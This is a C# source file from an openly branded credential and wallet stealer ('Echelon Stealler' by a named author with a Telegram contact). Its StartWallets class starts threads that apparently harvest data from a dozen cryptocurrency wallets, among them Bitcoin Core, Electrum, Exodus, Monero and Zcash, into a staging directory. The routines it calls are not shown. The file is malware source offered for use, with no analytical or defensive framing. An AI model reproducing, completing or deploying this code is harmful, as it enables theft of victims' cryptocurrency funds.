///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////

using System.Threading;

namespace Echelon
{
    class StartWallets
    {
        public static int count = 0;

        public static int Start(string Echelon_Dir)
        {
            new Thread(() =>
            {
                Armory.ArmoryStr(Echelon_Dir);
            }).Start(); //Bitcoin Armory Wallet
            new Thread(() =>
            {
                AtomicWallet.AtomicStr(Echelon_Dir);
            }).Start(); //Atomic Wallet
            new Thread(() =>
            {
                BitcoinCore.BCStr(Echelon_Dir);
            }).Start(); //Bitcoin Core
            new Thread(() =>
            {
                Bytecoin.BCNcoinStr(Echelon_Dir);
            }).Start(); //Bytecoin
            new Thread(() =>
            {
                DashCore.DSHcoinStr(Echelon_Dir);
            }).Start(); //Dash Core
            new Thread(() =>
            {
                Electrum.EleStr(Echelon_Dir);
            }).Start(); //Electrum
            new Thread(() =>
            {
                Ethereum.EcoinStr(Echelon_Dir);
            }).Start(); //Ethereum Wallet
            new Thread(() =>
            {
                LitecoinCore.LitecStr(Echelon_Dir);
            }).Start(); //Litecoin Core
            new Thread(() =>
            {
                Monero.XMRcoinStr(Echelon_Dir);
            }).Start(); //Monero Core
            new Thread(() =>
            {
                Exodus.ExodusStr(Echelon_Dir);
            }).Start();//Exodus Wallet
            new Thread(() =>
            {
                Jaxx.JaxxStr(Echelon_Dir);
            }).Start(); //Jaxx Liberty
            new Thread(() =>
            {
                Zcash.ZecwalletStr(Echelon_Dir);
            }).Start(); //Zec Wallet



            return count;
        }
    }
}
